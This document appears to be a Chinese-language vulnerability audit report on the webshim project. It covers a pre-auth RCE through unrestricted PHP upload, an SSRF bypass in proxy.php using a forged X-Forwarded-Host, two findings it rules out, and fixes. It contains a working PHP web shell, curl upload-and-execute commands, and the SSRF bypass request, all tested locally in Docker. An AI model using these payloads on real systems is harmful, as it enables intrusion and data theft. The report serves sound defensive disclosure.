# webshim 项目前认证 RCE/SSRF 动态验证分析报告

## 1. 摘要

本次针对 `/home/ljm/webshim` 项目进行了源码审计与 Docker 动态验证，重点目标为识别并确认前认证远程代码执行（Pre-auth RCE）漏洞。

最终结论：

1. **已验证前认证 RCE**：`demos/demos/filereader/upload_html.php` 与 `upload_json.php` 存在无认证、无类型校验的任意文件上传漏洞，攻击者可上传 `.php` 文件并直接访问实现远程代码执行。
2. **已验证前认证 SSRF**：`src/shims/FlashCanvas/proxy.php` 与同名副本存在基于 `X-Forwarded-Host` 的 Referer 检查绕过，可发起服务端请求读取内网资源。
3. **路径遍历增强不成立**：虽然上传代码未显式调用 `basename()`，但 PHP `rfc1867.c` multipart 解析器会自动剥离上传文件名中的路径前缀，因此 `../../shell.php` 最终只会落盘为 `shell.php`。
4. **Header Injection 不成立**：`save.php` 中的 `header()` 调用在现代 PHP 版本中会自动过滤 CR/LF，无法稳定构成可利用漏洞。

---

## 2. 分析范围

项目路径：

- `/home/ljm/webshim`

重点审计对象：

- `demos/demos/filereader/upload_html.php`
- `demos/demos/filereader/upload_json.php`
- `src/shims/FlashCanvas/proxy.php`
- `src/shims/FlashCanvasPro/proxy.php`
- `src/shims/FlashCanvas/save.php`
- `src/shims/FlashCanvasPro/save.php`
- `js-webshim/dev/shims/...` 下同名副本

动态验证环境：

- Docker 镜像：`php:8.1-apache`
- 容器名：`webshim-test`
- 端口映射：`8080 -> 80`

---

## 3. 漏洞一：upload_html.php / upload_json.php 前认证 RCE

### 3.1 受影响文件

- `demos/demos/filereader/upload_html.php`
- `demos/demos/filereader/upload_json.php`

### 3.2 关键代码

`upload_html.php`：

```php
<?php
if (isset($_POST['send'])) {
    $directory = "upload/";
    $a = 0;
    foreach ($_FILES['pictures']['name'] as $nameFile) {
        if (is_uploaded_file($_FILES['pictures']['tmp_name'][$a])) {
            move_uploaded_file($_FILES['pictures']['tmp_name'][$a], $directory . $_FILES['pictures']['name'][$a]);
            echo $nameFile .': <img src="'. $directory.$nameFile.'" /><br />';
        }
        $a++;
    }
}
?>
```

`upload_json.php`：

```php
<?php
header('Content-Type: application/json');
$directory = "upload/";
$a = 0;
echo "[";
foreach ($_FILES['pictures']['name'] as $nameFile) {
    if (is_uploaded_file($_FILES['pictures']['tmp_name'][$a])) {
        $success = move_uploaded_file($_FILES['pictures']['tmp_name'][$a], $directory . $_FILES['pictures']['name'][$a]);
        if(!$success){ $success = 0; }
        echo '{"name": "'.$nameFile.'", "src": "'. $directory.$nameFile.'", "success": '.$success.'}';
    }
    $a++;
}
echo "]";
?>
```

### 3.3 漏洞成因

这两个上传接口存在完全相同的问题：

1. **无认证**：代码中不存在任何登录、会话、token 或权限判断。
2. **无扩展名校验**：允许上传任意后缀文件，包括 `.php`。
3. **无 MIME 校验**：不检查文件真实内容类型。
4. **无目录执行防护**：上传目录位于 Web 可访问路径下。
5. **无输出编码**：上传文件名被直接输出到 HTML/JSON，附带 XSS 风险。

这意味着攻击者只需构造一个包含 PHP 代码的文件并上传，即可通过 HTTP 请求直接触发服务端执行。

### 3.4 动态验证过程

全部验证操作均在 Docker 容器内完成。

#### 3.4.1 upload_html.php 验证

容器内创建测试文件：

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
```

上传请求：

```bash
curl -s -X POST http://127.0.0.1/webshim/demos/demos/filereader/upload_html.php \
  -F "send=1" \
  -F "pictures[]=@/tmp/shell.php;filename=shell.php;type=application/x-php"
```

上传响应：

```html
shell.php: <img src="upload/shell.php" /><br />
```

执行命令验证：

```bash
curl -s "http://127.0.0.1/webshim/demos/demos/filereader/upload/shell.php?cmd=id"
```

返回结果：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

再验证：

```bash
curl -s "http://127.0.0.1/webshim/demos/demos/filereader/upload/shell.php?cmd=whoami"
```

返回：

```text
www-data
```

#### 3.4.2 upload_json.php 验证

容器内创建测试文件：

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/json_shell.php
```

上传请求：

```bash
curl -s -X POST http://127.0.0.1/webshim/demos/demos/filereader/upload_json.php \
  -F "send=1" \
  -F "pictures[]=@/tmp/json_shell.php;filename=json_shell.php;type=application/x-php"
```

返回结果：

```json
[{"name": "json_shell.php", "src": "upload/json_shell.php", "success": 1}]
```

命令执行验证：

```bash
curl -s "http://127.0.0.1/webshim/demos/demos/filereader/upload/json_shell.php?cmd=whoami"
```

返回：

```text
www-data
```

### 3.5 结论

该漏洞已通过动态方式完整验证，属于：

- **前认证**
- **低复杂度**
- **可稳定复现**
- **直接导致 RCE**

### 3.6 风险评级

**严重级别：Critical**

建议 CVSS 参考：`9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)`

---

## 4. 漏洞二：FlashCanvas proxy.php 前认证 SSRF

### 4.1 受影响文件

- `src/shims/FlashCanvas/proxy.php`
- `src/shims/FlashCanvasPro/proxy.php`
- `js-webshim/dev/shims/FlashCanvas/proxy.php`
- `js-webshim/dev/shims/FlashCanvasPro/proxy.php`

### 4.2 关键代码

```php
function FCgetHostName() {
    if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {
        return $_SERVER['HTTP_X_FORWARDED_HOST'];
    } else if (isset($_SERVER['HTTP_HOST'])) {
        return $_SERVER['HTTP_HOST'];
    } else {
        return $_SERVER['SERVER_NAME'];
    }
}

$host = FCgetHostName();
$pattern = '#^https?://' . str_replace('.', '\\.', $host) . '(:\\d*)?/#';
if (!preg_match($pattern, $_SERVER['HTTP_REFERER'])) {
    exit;
}

$url = str_replace($search, $replace, $_GET['url']);
$ch = curl_init($url);
curl_exec($ch);
```

### 4.3 漏洞成因

设计意图是仅允许来自本站的 Referer 请求访问代理功能，但校验逻辑错误地信任了：

- `HTTP_X_FORWARDED_HOST`

该值来源于客户端可控请求头，因此攻击者可伪造：

```http
X-Forwarded-Host: attacker.com
Referer: http://attacker.com/
```

从而让 Referer 正则匹配通过。绕过后，`url` 参数仅要求以 `http://` 或 `https://` 开头，未限制目标域名/IP，可用于访问内网服务。

### 4.4 动态验证过程

#### 4.4.1 无绕过头部

```bash
curl -s "http://127.0.0.1/webshim/src/shims/FlashCanvas/proxy.php?url=http://127.0.0.1/webshim/readme.md"
```

结果：

- 响应长度为 `0`
- 说明 Referer 检查未通过，脚本直接 `exit`

#### 4.4.2 带绕过头部

```bash
curl -s \
  -H "X-Forwarded-Host: attacker.com" \
  -H "Referer: http://attacker.com/" \
  "http://127.0.0.1/webshim/src/shims/FlashCanvas/proxy.php?url=http://127.0.0.1/webshim/readme.md"
```

结果：

- 响应长度：`4913`
- 成功返回 `readme.md` 内容

这证明：

1. Referer 检查可被伪造请求头绕过
2. 绕过后脚本可代服务器请求并返回内网资源内容

### 4.5 结论

该漏洞已动态验证成立，但其本质是：

- **前认证 SSRF**
- 并非直接 RCE
- 可作为进一步利用的辅助条件

### 4.6 风险评级

**严重级别：High**

---

## 5. 路径遍历增强分析（最终否定）

### 5.1 初始怀疑

由于上传代码直接拼接：

```php
$directory . $_FILES['pictures']['name'][$a]
```

初看似乎支持如下利用：

```text
filename=../../shell.php
```

从而跳出 `upload/` 目录。

### 5.2 动态验证结果

在容器内对以下文件名格式分别测试：

- `../../root_shell.php`
- `../root_shell.php`
- `..\\..\\root_shell.php`
- `./../../root_shell.php`
- `/var/www/html/root_shell.php`

结果全部一致：

- 上传响应中只出现 `root_shell.php`
- 文件最终只落盘在：
  - `upload/root_shell.php`
- 项目根目录、`/var/www/html/` 等位置均未出现遍历写入结果

### 5.3 原因

这是 PHP `rfc1867.c` multipart 上传解析器的内建安全行为：

- 自动对 `filename` 执行等价于 `basename()` 的路径剥离
- 去掉所有目录前缀，只保留纯文件名

该行为在 PHP `4.3.9+ / 5.0.2+`（修复 `CVE-2004-0535` 后）已长期存在。

### 5.4 最终结论

**路径遍历增强在现代 PHP 环境下不成立。**

但这**不影响主漏洞成立**，因为直接上传 `.php` 到 `upload/` 目录本身已经足够实现 RCE。

---

## 6. save.php Header Injection 分析（最终否定）

### 6.1 关键代码

```php
header('Content-Disposition: attachment; filename="' . $filename . '"');
```

`$filename` 来自用户输入，表面看似可能发生响应头注入。

### 6.2 否定原因

现代 PHP 中：

- `header()` 会过滤 CR/LF
- 含换行的 header 值会被拒绝或抛出警告

因此无法稳定插入第二个响应头或构造响应拆分。

### 6.3 最终结论

该点在现代 PHP 环境中**不构成可利用漏洞**。

---

## 7. 影响总结

### 已验证漏洞

1. **前认证 RCE**
   - 文件：`upload_html.php`, `upload_json.php`
   - 条件：无认证、可上传 `.php`、目录可执行
   - 结果：远程命令执行

2. **前认证 SSRF**
   - 文件：`proxy.php` 系列
   - 条件：可控 `X-Forwarded-Host` + `Referer`
   - 结果：读取内网 HTTP 资源

### 已否定项

1. 路径遍历增强（被 PHP basename 处理阻断）
2. Header Injection（被现代 PHP `header()` 保护阻断）

---

## 8. 修复建议

### 8.1 针对 upload_html.php / upload_json.php

必须至少执行以下修复：

1. **增加认证/授权控制**
   - 上传接口不得对匿名用户开放

2. **限制允许上传的扩展名和 MIME**
   - 仅允许白名单图片类型
   - 使用 `finfo_file()` 验证真实内容

3. **将上传目录移出 Web Root**
   - 避免上传文件可直接通过 HTTP 访问

4. **禁止执行上传目录内脚本**
   - Apache/Nginx 配置中显式禁用 PHP 执行

5. **安全处理文件名**
   - 使用随机文件名替代用户原始文件名
   - 输出前进行 HTML/JSON 编码

### 8.2 针对 proxy.php

1. **不要信任 `X-Forwarded-Host`**
   - 若确需使用，应仅在可信反向代理场景下启用，并验证来源

2. **不要以 Referer 作为安全边界**
   - Referer 可伪造，不应用于授权判断

3. **对代理目标建立白名单**
   - 限定可访问域名/IP
   - 阻止访问内网地址、环回地址和云元数据地址

4. **若无业务必要，删除该代理功能**

---

## 9. 最终结论

本项目中，真正满足“前认证 RCE”目标的核心漏洞为：

- `demos/demos/filereader/upload_html.php`
- `demos/demos/filereader/upload_json.php`

二者均已通过 Docker 动态验证，属于**已确认前认证远程代码执行漏洞**。

`proxy.php` 属于已验证的前认证 SSRF，可作为附加风险点，但不应替代主结论。

路径遍历增强与 Header Injection 均已通过代码与动态行为分析被否定，不应写入最终漏洞主结论中。
